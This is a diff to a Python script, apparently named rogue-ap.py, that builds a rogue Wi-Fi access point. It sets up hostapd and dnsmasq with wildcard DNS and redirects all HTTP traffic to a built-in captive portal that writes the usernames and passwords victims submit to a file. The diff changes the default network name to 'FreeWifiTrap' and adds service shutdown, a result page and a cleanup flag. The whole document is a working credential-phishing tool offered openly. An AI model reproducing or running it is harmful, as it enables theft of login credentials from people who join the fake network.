@@ -1,6 +1,5 @@
-# rogue-ap.py (Python-only version with embedded web server)
-
 import os
+import sys
 import signal
 import subprocess
 import threading
@@ -11,11 +10,11 @@ import urllib.parse
 def run(command):
     """Execute a shell command and return stdout and stderr."""
     try:
-        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        return result.stdout.decode(), result.stderr.decode()
-    except subprocess.CalledProcessError as e:
-        print(f"Command failed: {command}\n{e.stderr.decode()}")
-        return "", e.stderr.decode()
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return process
+    except Exception as e:
+        print(f"ERROR - Command failed: {command}\n{str(e)}")
+        return None
 
 
 def get_interfaces():
@@ -44,15 +43,19 @@ def select_interface():
 
 def select_directory():
     while True:
-        path = input("Enter absolute path to HTML root directory: ")
+        path = input("Enter absolute path to HTML root directory [default is current_path/www]: ")
+        if path == "":
+            defdir = os.path.join(os.getcwd(), "www")
+            if os.path.isdir(defdir):
+                return defdir
         if os.path.isabs(path) and os.path.isdir(path):
             return path
         print("Invalid path. Must be an existing absolute directory.")
 
 
 def get_ap_name():
-    ap_name = input("Enter AP name [default: Free Wifi]: ").strip()
-    return ap_name if ap_name else "Free Wifi"
+    ap_name = input("Enter AP name [default: FreeWifiTrap]: ").strip()
+    return ap_name if ap_name else "FreeWifiTrap"
 
 
 class CaptivePortalHandler(BaseHTTPRequestHandler):
@@ -61,7 +64,13 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.end_headers()
-            with open("www/index.html", "rb") as f:
+            with open("index.html", "rb") as f:
+                self.wfile.write(f.read())
+        elif self.path == "/res" or self.path == "/res.html":
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            with open("res.html", "rb") as f:
                 self.wfile.write(f.read())
         else:
             self.send_response(302)
@@ -80,7 +89,7 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
                 f.write(f"[+] User: {username} | Pass: {password}\n")
 
             self.send_response(302)
-            self.send_header('Location', 'https://google.com')
+            self.send_header('Location', '/res')
             self.end_headers()
         else:
             self.send_response(404)
@@ -98,17 +107,26 @@ def setup_ap(iface, ssid):
     print(f"[+] Starting rogue AP '{ssid}' on interface {iface}...")
 
     # Stop interfering services
+    print("- NetworkManager")
+    run("nmcli radio wifi off")
+    run("rfkill unblock wlan")
+    run(f"nmcli device set {iface} managed no")
     run("systemctl stop NetworkManager")
+    run("killall wpa_supplicant")
+    run("sleep 2")
 
     # Save iptables rules
+    print("- iptables")
     run("iptables-save > /tmp/iptables.bak")
 
-    # Set interface down and up in monitor mode
+    # Set interface down and up in AP mode
+    print(f"- {iface} ap mode")
     run(f"ip link set {iface} down")
     run(f"iw dev {iface} set type __ap")
     run(f"ip link set {iface} up")
 
     # Create dnsmasq config
+    print("- dnsmask")
     dnsmasq_conf = f"""
 dhcp-range=192.168.1.2,192.168.1.20,255.255.255.0,24h
 interface={iface}
@@ -121,21 +139,27 @@ address=/#/192.168.1.1
     run(f"dnsmasq -C /tmp/dnsmasq.conf")
 
     # Set static IP
+    print("- Static IP")
     run(f"ip addr add 192.168.1.1/24 dev {iface}")
 
     # Enable hostapd
+    print("- hostapd")
     hostapd_conf = f"""
 interface={iface}
 driver=nl80211
 ssid={ssid}
 channel=6
+hw_mode=g
+wmm_enabled=1
+ignore_broadcast_ssid=0
 """
     with open("/tmp/hostapd.conf", "w") as f:
         f.write(hostapd_conf)
 
-    run(f"hostapd /tmp/hostapd.conf &")
+    run(f"hostapd /tmp/hostapd.conf")
 
     # Redirect all HTTP to our server
+    print("- iptables redirect")
     run(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80")
     run(f"iptables -t nat -A POSTROUTING -j MASQUERADE")
 
@@ -154,9 +178,20 @@ def cleanup(iface):
     run("iptables-restore < /tmp/iptables.bak")
     print("Deleting temp files...")
     run("rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf /tmp/iptables.bak")
-    run("systemctl start NetworkManager")
+    run("nmcli radio wifi on")
+    run(f"nmcli device set {iface} managed yes")
+    run("systemctl restart NetworkManager")
     print("System fully restored.")
 
+if "--clean" in sys.argv:
+    try:
+        idx = sys.argv.index("--clean")
+        interface = sys.argv[idx + 1]
+        cleanup(interface)
+        sys.exit(0)
+    except (IndexError, ValueError):
+        print("[-] Usage: --clean <interface>")
+        sys.exit(1)
 
 if __name__ == "__main__":
     iface = select_interface()
